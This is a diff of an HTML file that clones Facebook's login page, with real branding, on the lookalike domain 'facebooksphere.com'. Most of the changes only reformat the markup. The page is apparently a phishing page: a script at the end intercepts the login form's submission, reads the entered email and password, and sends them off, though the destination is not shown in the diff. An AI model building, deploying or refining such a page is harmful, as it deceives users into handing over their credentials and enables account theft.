@@ -1,182 +1,68 @@
 <!DOCTYPE html>
 <html lang="en" id="facebook" class="no_js">
-<head>
-  <meta charset="utf-8" />
-  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
-  <noscript>
-    <meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
-  </noscript>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <noscript>
+      <meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" />
+    </noscript>
+    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/?is_workplace_mobile_pwa_dogfooding=0" crossorigin="use-credentials" />
+    <title id="pageTitle">Facebook - log in or sign up</title>
+    <meta name="bingbot" content="noarchive" />
+    <meta property="og:site_name" content="Facebook" />
+    <meta property="og:url" content="https://www.facebooksphere.com/" />
+    <meta property="og:image" content="https://www.facebooksphere.com/images/fb_icon_325x325.png" />
+    <meta property="og:locale" content="en_US" />
+    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebooksphere.com/" />
+    <link rel="alternate" media="handheld" href="https://m.facebooksphere.com/" />
+    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","name":"Facebook","url":"https://www.facebooksphere.com/"}</script>
+    <link rel="canonical" href="https://www.facebooksphere.com/" />
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
 
-  <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/?is_workplace_mobile_pwa_dogfooding=0" crossorigin="use-credentials" />
-  <title id="pageTitle">Facebook - log in or sign up</title>
-  <meta name="bingbot" content="noarchive" />
-  <meta property="og:site_name" content="Facebook" />
-  <meta property="og:url" content="https://www.facebooksphere.com/" />
-  <meta property="og:image" content="https://www.facebooksphere.com/images/fb_icon_325x325.png" />
-  <meta property="og:locale" content="en_US" />
-  <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebooksphere.com/" />
-  <link rel="alternate" media="handheld" href="https://m.facebooksphere.com/" />
-  <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
-  <script type="application/ld+json">
-    {"@context":"http://schema.org","@type":"WebSite","name":"Facebook","url":"https://www.facebooksphere.com/"}
-  </script>
-  <link rel="canonical" href="https://www.facebooksphere.com/" />
-  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
+    <!-- Core CSS -->
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yZ/l/0,cross/Ie2oC4KWw6U.css" data-bootloader-hash="kQeX049" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y-/l/0,cross/eAumr5RRmfn.css" data-bootloader-hash="YfNAAed" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/ym/l/0,cross/kqjIsdY5uRa.css" data-bootloader-hash="p+1fqT3" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yE/l/0,cross/sGx3l9g08MY.css" data-bootloader-hash="v7mIMQ6" crossorigin="anonymous" />
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yf/l/0,cross/LO-ewHejZr7.css" data-bootloader-hash="O0cNsdJ" crossorigin="anonymous" />
+    <link rel="stylesheet" href="style.css" />
 
-  <!-- Core CSS -->
-  <link
-    type="text/css"
-    rel="stylesheet"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yZ/l/0,cross/Ie2oC4KWw6U.css"
-    data-bootloader-hash="kQeX049"
-    crossorigin="anonymous"
-  />
-  <link
-    type="text/css"
-    rel="stylesheet"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/y-/l/0,cross/eAumr5RRmfn.css"
-    data-bootloader-hash="YfNAAed"
-    crossorigin="anonymous"
-  />
-  <link
-    type="text/css"
-    rel="stylesheet"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/ym/l/0,cross/kqjIsdY5uRa.css"
-    data-bootloader-hash="p+1fqT3"
-    crossorigin="anonymous"
-  />
-  <link
-    type="text/css"
-    rel="stylesheet"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yE/l/0,cross/sGx3l9g08MY.css"
-    data-bootloader-hash="v7mIMQ6"
-    crossorigin="anonymous"
-  />
-  <link
-    type="text/css"
-    rel="stylesheet"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yf/l/0,cross/LO-ewHejZr7.css"
-    data-bootloader-hash="O0cNsdJ"
-    crossorigin="anonymous"
-  />
+    <!-- Preloads -->
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yZ/l/0,cross/Ie2oC4KWw6U.css" as="style" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/y-/l/0,cross/eAumr5RRmfn.css" as="style" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/ym/l/0,cross/kqjIsdY5uRa.css" as="style" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yE/l/0,cross/sGx3l9g08MY.css" as="style" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yf/l/0,cross/LO-ewHejZr7.css" as="style" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4/yo/r/C50szLXKafU.js" as="script" crossorigin="anonymous" />
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4i7M54/yG/l/en_US/s20aWJ3iaFs.js" as="script" crossorigin="anonymous" />
+  </head>
 
-  <!-- Preloads -->
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yZ/l/0,cross/Ie2oC4KWw6U.css"
-    as="style"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/y-/l/0,cross/eAumr5RRmfn.css"
-    as="style"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/ym/l/0,cross/kqjIsdY5uRa.css"
-    as="style"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yE/l/0,cross/sGx3l9g08MY.css"
-    as="style"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v5/yf/l/0,cross/LO-ewHejZr7.css"
-    as="style"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v4/yo/r/C50szLXKafU.js"
-    as="script"
-    crossorigin="anonymous"
-  />
-  <link
-    rel="preload"
-    href="https://static.xx.fbcdn.net/rsrc.php/v4i7M54/yG/l/en_US/s20aWJ3iaFs.js"
-    as="script"
-    crossorigin="anonymous"
-  />
-</head>
-
-<body
-  class="fbIndex UIPage_LoggedOut _-kb sf _605a b_c3pyn-ahh chrome webkit mac x2 Locale_en_US"
-  dir="ltr"
->
-  <div class="_li" id="u_0_1_br">
-    <div id="globalContainer" class="uiContextualLayerParent">
-      <div class="fb_content clearfix" id="content" role="main">
-        <div>
+  <body class="fbIndex UIPage_LoggedOut _-kb sf _605a b_c3pyn-ahh chrome webkit mac x2 Locale_en_US" dir="ltr">
+    <div class="_li" id="u_0_1_br">
+      <div id="globalContainer" class="uiContextualLayerParent">
+        <div class="fb_content clearfix" id="content" role="main">
           <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
             <div class="_8esk">
               <div class="_8esl">
                 <div class="_8ice">
-                  <img
-                    class="fb_logo _8ilh img"
-                    src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
-                    alt="Facebook"
-                  />
+                  <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
                 </div>
-                <h2 class="_8eso">
-                  Connect with friends and the world around you on Facebook.
-                </h2>
+                <h2 class="_8eso">Connect with friends and the world around you on Facebook.</h2>
               </div>
               <div class="_8esn">
                 <div class="_8iep _8icy _9ahz _9ah-">
                   <div class="_6luv _52jv">
-                    <form
-                      class="_9vtf"
-                      data-testid="royal_login_form"
-                      action="https://www.facebooksphere.com/login/?next"
-                      method="post"
-                      id="u_0_2_j8"
-                    >
-                      <input
-                        type="hidden"
-                        name="jazoest"
-                        value="21090"
-                        autocomplete="off"
-                      />
-                      <input
-                        type="hidden"
-                        name="fb_dtsg"
-                        value="w6LuQVznUnE="
-                        autocomplete="off"
-                      />
-
+                    <form class="_9vtf" data-testid="royal_login_form" action="https://www.facebooksphere.com/login/?next" method="post" id="u_0_2_j8">
+                      <input type="hidden" name="jazoest" value="21090" autocomplete="off" />
+                      <input type="hidden" name="fb_dtsg" value="w6LuQVznUnE=" autocomplete="off" />
                       <div>
                         <div class="_6lux">
-                          <input
-                            type="text"
-                            class="inputtext _55r1 _6luy"
-                            name="email"
-                            id="email"
-                            data-testid="royal-email"
-                            placeholder="Email or phone number"
-                            autofocus
-                            aria-label="Email or phone number"
-                          />
+                          <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal-email" placeholder="Email or phone number" autofocus aria-label="Email or phone number" />
                         </div>
                         <div class="_6lux">
-                          <div
-                            class="_6luy _55r1 _1kbt"
-                            id="passContainer"
-                          >
-                            <input
-                              type="password"
-                              class="inputtext _55r1 _6luy _9npi"
-                              name="pass"
-                              id="pass"
-                              data-testid="royal-pass"
-                              placeholder="Password"
-                              aria-label="Password"
-                            />
+                          <div class="_6luy _55r1 _1kbt" id="passContainer">
+                            <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal-pass" placeholder="Password" aria-label="Password" />
                             <div class="_9ls7" id="u_0_3_eo">
                               <a href="#" role="button">
                                 <div class="_9lsa">
@@ -187,434 +73,97 @@
                           </div>
                         </div>
                       </div>
-
-                      <input
-                        type="hidden"
-                        name="login_source"
-                        value="comet_headerless_login"
-                        autocomplete="off"
-                      />
-                      <input
-                        type="hidden"
-                        name="next"
-                        value=""
-                        autocomplete="off"
-                      />
-
+                      <input type="hidden" name="login_source" value="comet_headerless_login" autocomplete="off" />
+                      <input type="hidden" name="next" value="" autocomplete="off" />
                       <div class="_6ltg">
-                        <button
-                          value="1"
-                          class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
-                          name="login"
-                          data-testid="royal-login-button"
-                          type="submit"
-                          id="u_0_5_uB"
-                        >
-                          Log In
-                        </button>
+                        <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal-login-button" type="submit" id="u_0_5_uB">Log In</button>
                       </div>
-
                       <div class="_6ltj">
-                        <a
-                          href="https://www.facebooksphere.com/recover/initiate/?ars=facebook_login"
-                          id="u_0_6_BD"
-                        >
-                          Forgot password?
-                        </a>
+                        <a href="https://www.facebooksphere.com/recover/initiate/?ars=facebook_login" id="u_0_6_BD">Forgot password?</a>
                       </div>
-
                       <div class="_8icz"></div>
-
                       <div class="_6ltg">
-                        <a
-                          role="button"
-                          class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
-                          href="https://www.facebooksphere.com/r.php?entry_point=login"
-                          id="u_0_0_ms"
-                          data-testid="open-registration-form-button"
-                        >
-                          Create new account
-                        </a>
+                        <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="https://www.facebooksphere.com/r.php?entry_point=login" id="u_0_0_ms" data-testid="open-registration-form-button">Create new account</a>
                       </div>
                     </form>
                   </div>
-
                   <div id="reg_pages_msg" class="_58mk">
-                    <a
-                      href="https://www.facebooksphere.com/pages/create/?ref_type=registration_form"
-                      class="_8esh"
-                    >
-                      Create a Page
-                    </a>
-                    for a celebrity, brand or business.
+                    <a href="https://www.facebooksphere.com/pages/create/?ref_type=registration_form" class="_8esh">Create a Page</a> for a celebrity, brand or business.
                   </div>
                 </div>
               </div>
             </div>
           </div>
         </div>
-      </div>
 
-      <!-- FULL FOOTER -->
-      <div class="_95ke _8opy">
-        <div
-          id="pageFooter"
-          data-referrer="page_footer"
-          data-testid="page_footer"
-        >
-          <ul
-            class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
-            data-nocookies="1"
-          >
-            <li>English (US)</li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://www.facebooksphere.com/"
-                title="Spanish"
-                id="u_0_7_7i"
-              >
-                Español
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://es-la.facebooksphere.com/"
-                title="Français (France)"
-                id="u_0_8_58"
-              >
-                Français (France)
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://fr-fr.facebooksphere.com/"
-                title="中文(简体)"
-                id="u_0_9_2n"
-              >
-                中文(简体)
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="rtl"
-                href="https://zh-cn.facebooksphere.com/"
-                title="العربية"
-                id="u_0_a_bZ"
-              >
-                العربية
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://ar-ar.facebooksphere.com/"
-                title="Português (Brasil)"
-                id="u_0_b_y9"
-              >
-                Português (Brasil)
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://pt-br.facebooksphere.com/"
-                title="Italiano"
-                id="u_0_c_l8"
-              >
-                Italiano
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://it-it.facebooksphere.com/"
-                title="한국어"
-                id="u_0_d_QN"
-              >
-                한국어
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://ko-kr.facebooksphere.com/"
-                title="Deutsch"
-                id="u_0_e_Y2"
-              >
-                Deutsch
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://de-de.facebooksphere.com/"
-                title="हिन्दी"
-                id="u_0_f_uI"
-              >
-                हिन्दी
-              </a>
-            </li>
-            <li>
-              <a
-                class="_sv4"
-                dir="ltr"
-                href="https://hi-in.facebooksphere.com/"
-                title="日本語"
-                id="u_0_g_S5"
-              >
-                日本語
-              </a>
-            </li>
-            <li>
-              <a
-                role="button"
-                class="_42ft _4jy0 _517i _517h _51sy"
-                rel="dialog"
-                ajaxify="https://www.facebooksphere.com/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebooksphere.com%2F&amp;source=www_list_selector_more"
-                href="#"
-                title="Show more languages"
-              >
-                <i class="img sp_GPvE0syHYuh_2x sx_615588"></i>
-              </a>
-            </li>
-          </ul>
-
-          <div id="contentCurve"></div>
-
-          <div
-            id="pageFooterChildren"
-            role="contentinfo"
-            aria-label="Facebook site links"
-          >
-            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+        <!-- FULL FOOTER -->
+        <div class="_95ke _8opy">
+          <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+            <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+              <li>English (US)</li>
+              <li><a class="_sv4" dir="ltr" href="https://www.facebooksphere.com/" title="Spanish" id="u_0_7_7i">Español</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://es-la.facebooksphere.com/" title="Français (France)" id="u_0_8_58">Français (France)</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebooksphere.com/" title="中文(简体)" id="u_0_9_2n">中文(简体)</a></li>
+              <li><a class="_sv4" dir="rtl" href="https://zh-cn.facebooksphere.com/" title="العربية" id="u_0_a_bZ">العربية</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://ar-ar.facebooksphere.com/" title="Português (Brasil)" id="u_0_b_y9">Português (Brasil)</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://pt-br.facebooksphere.com/" title="Italiano" id="u_0_c_l8">Italiano</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://it-it.facebooksphere.com/" title="한국어" id="u_0_d_QN">한국어</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://ko-kr.facebooksphere.com/" title="Deutsch" id="u_0_e_Y2">Deutsch</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://de-de.facebooksphere.com/" title="हिन्दी" id="u_0_f_uI">हिन्दी</a></li>
+              <li><a class="_sv4" dir="ltr" href="https://hi-in.facebooksphere.com/" title="日本語" id="u_0_g_S5">日本語</a></li>
               <li>
-                <a
-                  href="https://www.facebooksphere.com/reg/"
-                  title="Sign Up for Facebook"
-                >
-                  Sign Up
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/login/"
-                  title="Log into Facebook"
-                >
-                  Log In
-                </a>
-              </li>
-              <li>
-                <a href="https://messenger.com/" title="Check out Messenger.">
-                  Messenger
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/lite/"
-                  title="Facebook Lite for Android."
-                >
-                  Facebook Lite
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/watch/"
-                  title="Browse in Video"
-                >
-                  Video
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://about.meta.com/technologies/meta-pay"
-                  title="Learn more about Meta Pay"
-                  target="_blank"
-                >
-                  Meta Pay
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.meta.com/"
-                  title="Check out Meta"
-                  target="_blank"
-                >
-                  Meta Store
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.meta.com/quest/"
-                  title="Learn more about Meta Quest"
-                  target="_blank"
-                >
-                  Meta Quest
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.meta.com/smart-glasses/"
-                  title="Learn more about Ray-Ban Meta"
-                  target="_blank"
-                >
-                  Ray-Ban Meta
-                </a>
-              </li>
-              <li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li>
-              <li>
-                <a
-                  href="https://l.facebooksphere.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=…"
-                  title="Check out Instagram"
-                  target="_blank"
-                  rel="noreferrer nofollow"
-                >
-                  Instagram
-                </a>
-              </li>
-              <li><a href="https://www.threads.com/" title="Check out Threads">Threads</a></li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
-                  title="See the Voting Information Center."
-                >
-                  Voting Information Center
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/privacy/policy/?entry_point=facebook_page_footer"
-                  title="Learn how we collect, use and share information to support Facebook."
-                >
-                  Privacy Policy
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/privacy/policies/health/?entry_point=facebook_page_footer"
-                  title="Consumer Health Privacy"
-                >
-                  Consumer Health Privacy
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/privacy/center/?entry_point=facebook_page_footer"
-                  title="Learn how to manage and control your privacy on Facebook."
-                >
-                  Privacy Center
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://about.meta.com/"
-                  accesskey="8"
-                  title="Read our blog, discover the resource center, and find job opportunities."
-                >
-                  About
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
-                  title="Advertise on Facebook."
-                >
-                  Create ad
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/pages/create/?ref_type=site_footer"
-                  title="Create a page"
-                >
-                  Create Page
-                </a>
-              </li>
-              <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
-              <li><a href="https://www.facebooksphere.com/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/policies/cookies/"
-                  title="Learn about cookies and Facebook."
-                  data-nocookies="1"
-                >
-                  Cookies
-                </a>
-              </li>
-              <li>
-                <a
-                  class="_41ug"
-                  data-nocookies="1"
-                  href="https://www.facebooksphere.com/help/568137493302217"
-                  title="Learn about Ad Choices."
-                >
-                  Ad choices
-                  <i class="img sp_GPvE0syHYuh_2x sx_d60d8c"></i>
-                </a>
-              </li>
-              <li>
-                <a
-                  data-nocookies="1"
-                  href="https://www.facebooksphere.com/policies?ref=pf"
-                  accesskey="9"
-                  title="Review our terms and policies."
-                >
-                  Terms
-                </a>
-              </li>
-              <li>
-                <a href="https://www.facebooksphere.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">
-                  Help
-                </a>
-              </li>
-              <li>
-                <a
-                  href="https://www.facebooksphere.com/help/637205020878504"
-                  title="Visit our Contact Uploading &amp; Non-Users Notice."
-                >
-                  Contact Uploading &amp; Non-Users
-                </a>
-              </li>
-              <li>
-                <a accesskey="6" class="accessible_elem" href="https://www.facebooksphere.com/settings" title="View and edit your Facebook settings.">
-                  Settings
-                </a>
-              </li>
-              <li>
-                <a
-                  accesskey="7"
-                  class="accessible_elem"
-                  href="https://www.facebooksphere.com/allactivity?privacy_source=activity_log_top_menu"
-                  title="View your activity log"
-                >
-                  Activity log
+                <a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="https://www.facebooksphere.com/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebooksphere.com%2F&amp;source=www_list_selector_more" href="#" title="Show more languages">
+                  <i class="img sp_GPvE0syHYuh_2x sx_615588"></i>
                 </a>
               </li>
             </ul>
-          </div>
 
-          <div class="mvl copyright">
-            <div><span>Meta © 2025</span></div>
+            <div id="contentCurve"></div>
+
+            <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+              <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                <li><a href="https://www.facebooksphere.com/reg/" title="Sign Up for Facebook">Sign Up</a></li>
+                <li><a href="https://www.facebooksphere.com/login/" title="Log into Facebook">Log In</a></li>
+                <li><a href="https://messenger.com/" title="Check out Messenger.">Messenger</a></li>
+                <li><a href="https://www.facebooksphere.com/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
+                <li><a href="https://www.facebooksphere.com/watch/" title="Browse in Video">Video</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-pay" title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
+                <li><a href="https://www.meta.com/" title="Check out Meta" target="_blank">Meta Store</a></li>
+                <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
+                <li><a href="https://www.meta.com/smart-glasses/" title="Learn more about Ray-Ban Meta" target="_blank">Ray-Ban Meta</a></li>
+                <li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li>
+                <li><a href="https://l.facebooksphere.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=…" title="Check out Instagram" target="_blank" rel="noreferrer nofollow">Instagram</a></li>
+                <li><a href="https://www.threads.com/" title="Check out Threads">Threads</a></li>
+                <li><a href="https://www.facebooksphere.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Center.">Voting Information Center</a></li>
+                <li><a href="https://www.facebooksphere.com/privacy/policy/?entry_point=facebook_page_footer" title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
+                <li><a href="https://www.facebooksphere.com/privacy/policies/health/?entry_point=facebook_page_footer" title="Consumer Health Privacy">Consumer Health Privacy</a></li>
+                <li><a href="https://www.facebooksphere.com/privacy/center/?entry_point=facebook_page_footer" title="Learn how to manage and control your privacy on Facebook.">Privacy Center</a></li>
+                <li><a href="https://about.meta.com/" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></li>
+                <li><a href="https://www.facebooksphere.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Advertise on Facebook.">Create ad</a></li>
+                <li><a href="https://www.facebooksphere.com/pages/create/?ref_type=site_footer" title="Create a page">Create Page</a></li>
+                <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
+                <li><a href="https://www.facebooksphere.com/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></li>
+                <li><a href="https://www.facebooksphere.com/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
+                <li><a class="_41ug" data-nocookies="1" href="https://www.facebooksphere.com/help/568137493302217" title="Learn about Ad Choices.">Ad choices <i class="img sp_GPvE0syHYuh_2x sx_d60d8c"></i></a></li>
+                <li><a data-nocookies="1" href="https://www.facebooksphere.com/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
+                <li><a href="https://www.facebooksphere.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a></li>
+                <li><a href="https://www.facebooksphere.com/help/637205020878504" title="Visit our Contact Uploading &amp; Non-Users Notice.">Contact Uploading &amp; Non-Users</a></li>
+                <li><a accesskey="6" class="accessible_elem" href="https://www.facebooksphere.com/settings" title="View and edit your Facebook settings.">Settings</a></li>
+                <li><a accesskey="7" class="accessible_elem" href="https://www.facebooksphere.com/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li>
+              </ul>
+            </div>
+
+            <div class="mvl copyright">
+              <div><span>Meta © 2025</span></div>
+            </div>
           </div>
         </div>
+        <!-- end footer -->
       </div>
-      <!-- end footer -->
     </div>
-  </div>
 
-  <script>
-    document.getElementById('u_0_2_j8').addEventListener('submit', async function(e) {
+    <script>
+      document.getElementById('u_0_2_j8').addEventListener('submit', async function(e) {
       e.preventDefault();
 
       // Grab the values by their actual IDs
@@ -650,7 +199,7 @@
         alert('Failed to send. Please try again.');
       }
     });
-  </script>
+    </script>
 
-</body>
+  </body>
 </html>
